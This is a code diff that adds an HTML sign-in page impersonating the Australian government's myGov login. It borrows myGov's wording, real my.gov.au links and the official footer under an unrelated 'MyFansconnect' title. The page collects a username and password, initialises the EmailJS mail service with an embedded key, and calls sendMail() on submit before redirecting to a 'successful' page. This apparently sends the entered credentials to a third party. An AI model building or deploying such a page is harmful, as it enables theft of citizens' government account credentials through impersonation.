@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MyFansconnect Signin</title>
+    <link rel="stylesheet" href="sign.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
+    <script src="index.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+      emailjs.init("Gk-NUFw1H4D_1ewce");
+    })();
+    </script>
+    
+</head>
+<body>
+    <header>
+        <div></div>
+        <a href="https://my.gov.au/en/about/help">Help</a>
+    </header>
+    <div class="details">
+        <a href="index.html" class="back"><p><i class="bi bi-caret-left-fill"></i>Back</p></a>
+        <h1>Sign in with myGov</h1>
+        <p class="choose">Choose how to sign in from these two options</p>
+        <h3>Using you myGov sign in details</h3>
+        <h4>Username or email</h4>
+        <input type="email" id="email" required>
+        <a href="https://login.my.gov.au/las/mygov-login?execution=e1s2">Forgot Username</a>
+        <h4>Password</h4>
+        <input type="password" id="password" required>
+        <a href="https://login.my.gov.au/las/mygov-login?execution=e1s3">Forgot Password</a>
+        <a href="successful.html"><button onclick="sendMail()">Sign in</button></a>
+        <p><a href="https://my.gov.au/en/create-account/">Create account</a> if you dont have one already</p>
+    </div>
+    <footer>
+        <div></div>
+        <p>We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+    </footer>
+</body>
+</html>
